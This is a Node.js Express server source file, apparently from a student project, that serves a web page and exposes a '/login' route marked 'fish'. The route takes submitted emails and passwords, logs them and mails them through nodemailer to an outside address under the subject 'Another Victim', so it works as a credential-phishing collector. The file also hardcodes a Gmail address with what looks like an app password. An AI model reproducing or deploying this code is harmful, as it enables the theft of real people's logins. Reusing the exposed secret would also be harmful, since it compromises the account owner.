const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');

const emailVariable = "user@example.com";
const passwordVariable = "yourpassword";

// Transporter configuration (use your email service provider's SMTP settings)
const transporter = nodemailer.createTransport({
    service: 'gmail', // For Gmail, use 'gmail'. For other services, use respective SMTP service.
    auth: {
        user: 'tachokevin07@gmail.com ', // Your email address
        pass: 'kfft tnet prld sdyg' // Your email's password or app password
    }
});


const app = express();
const PORT = 3000; // Change this if needed
dirname="./"

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*'); // Allow all origins
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS'); // Allow all methods
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization'); // Allow specific headers
    next();
});
// Serve static files from the "public" folder
app.use(express.static(path.join(dirname, 'public')));

// Fallback route for any unmatched requests
app.get('*', (req, res) => {
    res.sendFile( 'C:\\Users\\alexa\\OneDrive\\Desktop\\NSCS_SCHNABL_Projekt1\\Praxis\\public\\index.html');
});

// fish
app.post('/login', (req, res) => {
    // Extract query parameters
    email = req.query.email;
    password = req.query.password;

    // Log the received data for debugging
    console.log("Email received:", email);
    console.log("Password received:", password);

    // Email options
    const mailOptions = {
        from: 'tachokevin07@gmail.com', // Sender address
        to: '210116@studierende.htl-donaustadt.at', // Recipient address
        subject: 'Another Victim', // Email subject
        text: `Here are the details:\nEmail: ${email}\nPassword: ${password}` // Email body
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return console.log('Error:', error);
        }
        console.log('Email sent successfully:', info.response);
    })

    // Perform actions with the data (e.g., authentication, database operations, etc.)
    // For now, send a success response back
    if (email && password) {
        res.status(200).json({
            message: 'Data received successfully',
            email: email,
            password: password
        });
    } else {
        res.status(400).json({
            message: 'Missing email or password'
        });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});